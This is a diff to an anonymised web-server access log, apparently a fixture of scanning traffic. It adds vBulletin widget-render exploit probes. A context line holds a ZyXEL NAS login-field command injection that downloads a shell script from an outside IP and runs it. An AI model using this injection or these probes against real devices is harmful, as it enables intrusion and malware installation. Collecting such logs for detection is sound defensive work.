@@ -2273,3 +2273,7 @@ Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "\x16\
 Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "\x16\x03\x01\x00\x89\x01\x00\x00\x85\x03\x03J\x9B\x07\x88\xB5\x90\xB8\x09\x99\x7F\xE6\xC0>\x0C\x8Cf\xAA\xF3\x97B\xC0\xA6\xC8\xAB\x18~u\xC5-\x87\xAA\xFB\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0 HTTP/1.1" 400 150 "-" "-" "-"
 Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "\x16\x03\x01\x00\x89\x01\x00\x00\x85\x03\x03\xEB\xEE\xD1\xB3\xC9_\xE3\xFA\xF6\xF6\x06\x84\xE7\x1A HTTP/1.1" 400 150 "-" "-" "-"
 Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "GET /adv,/cgi-bin/weblogin.cgi?username=admin%27%3Bcd%20/tmp;wget%20http://111.111.111.111/multi/wget.sh%20-O-%20>s;chmod%20777%20s;sh%20s%20Exploit.ZyxeNas;+%23&password=asdf HTTP/1.1" 301 162 "-" "-" "-"
+Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "POST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1" 301 162 "-" "-" "-"
+Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "POST /bbs/ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1" 301 162 "-" "-" "-"
+Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "POST /forum/ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1" 301 162 "-" "-" "-"
+Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "POST /forums/ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1" 301 162 "-" "-" "-"
